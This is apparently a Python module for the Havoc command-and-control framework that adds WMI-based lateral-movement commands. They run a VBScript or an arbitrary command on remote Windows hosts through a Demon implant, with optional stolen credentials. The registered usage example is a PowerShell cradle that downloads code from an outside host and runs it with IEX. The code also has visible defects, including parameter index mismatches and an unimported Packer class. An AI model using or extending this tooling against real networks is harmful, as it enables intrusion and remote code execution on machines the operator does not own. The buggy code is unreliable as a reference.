from havoc import Demon, RegisterCommand, RegisterModule
import re

def wmi_eventsub( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    num_params = len(params)

    target   = ''
    username = ''
    password = ''
    domain   = ''
    is_current = True

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target = f'\\\\{params[ 0 ]}\\ROOT\\SUBSCRIPTION'

    try:
        with open(params[ 1 ], 'r') as f:
            vbscript = f.read()
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid vbscript path" )
        return False

    if num_params > 2 and num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params == 5:
        is_current = False
        username = params[ 3 ]
        password = params[ 4 ]
        domain   = params[ 5 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(vbscript)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run a VBS script in {target} via wmi" )

    demon.InlineExecute( TaskID, "go", f"EventSub/bin/EventSub.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def wmi_proccreate( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    domain     = ''
    command    = ''
    is_current = True

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target  = f'\\\\{params[ 0 ]}\\ROOT\\CIMV2'
    command = params[ 1 ]

    if num_params > 2 and num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params == 6:
        is_current = False
        username = params[ 2 ]
        password = params[ 3 ]
        domain   = params[ 4 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(command)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run command on {target} via wmi" )

    demon.InlineExecute( TaskID, "go", f"ProcCreate/bin/ProcCreate.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/demon.vba" )
RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
